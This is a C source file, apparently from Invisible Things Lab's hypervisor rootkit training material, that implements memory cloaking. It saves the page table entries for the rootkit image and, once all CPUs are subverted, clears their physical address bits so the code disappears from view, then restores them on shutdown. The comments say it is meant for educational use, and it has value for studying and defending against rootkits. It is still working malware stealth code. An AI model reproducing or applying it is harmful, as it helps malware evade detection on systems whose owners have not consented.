/* 
 * Copyright holder: Invisible Things Lab
 * 
 * This software is protected by domestic and International
 * copyright laws. Any use (including publishing and
 * distribution) of this software requires a valid license
 * from the copyright holder.
 *
 * This software is provided for the educational use only
 * during the Black Hat training. This software should not
 * be used on production systems.
 *
 */

#include "memcloak.h"


#define	MAX_PTES	0x100

static ULONG	g_uNumberOfPages;

static BOOLEAN	g_bCloakEnabled=FALSE;

static ULONG	g_uNumberOfProcessors;
extern ULONG	g_uSubvertedCPUs;
static PULONG64	g_PteAddresses[MAX_PTES];
static ULONG64	g_OldPteValues[MAX_PTES];


NTSTATUS NTAPI McInitCloak(PVOID ImageStart,ULONG ImageSize)
{
	ULONG	i;
	NTSTATUS	Status;


	g_uNumberOfPages=BYTES_TO_PAGES(ImageSize);

	for (i=0;i<g_uNumberOfPages;i++) {
		if (!NT_SUCCESS(Status=CmGetPagePTEAddress((PVOID)((ULONG64)ImageStart+PAGE_SIZE*i),&g_PteAddresses[i],NULL))) {
			DbgPrint("McInitCloak(): CmGetPagePTEAddress() failed with status 0x%08X\n",Status);
			return Status;
		}
		g_OldPteValues[i]=*g_PteAddresses[i];
	}

	g_bCloakEnabled=TRUE;

	return STATUS_SUCCESS;
}



NTSTATUS NTAPI McCloak()
{
	ULONG	i;


	if (!g_bCloakEnabled)
		return;

	if (g_uSubvertedCPUs==g_uNumberOfProcessors) {

		for (i=0;i<g_uNumberOfPages;i++)
			*g_PteAddresses[i]=g_OldPteValues[i] & 0xfff0000000000fff;
	}


	return STATUS_SUCCESS;
}


NTSTATUS NTAPI McShutdownCloak()
{
	ULONG	i;


	if (!g_bCloakEnabled)
		return;

	if (g_uSubvertedCPUs==0) {

		for (i=0;i<g_uNumberOfPages;i++)
			*g_PteAddresses[i]=g_OldPteValues[i];
	}

	return STATUS_SUCCESS;
}
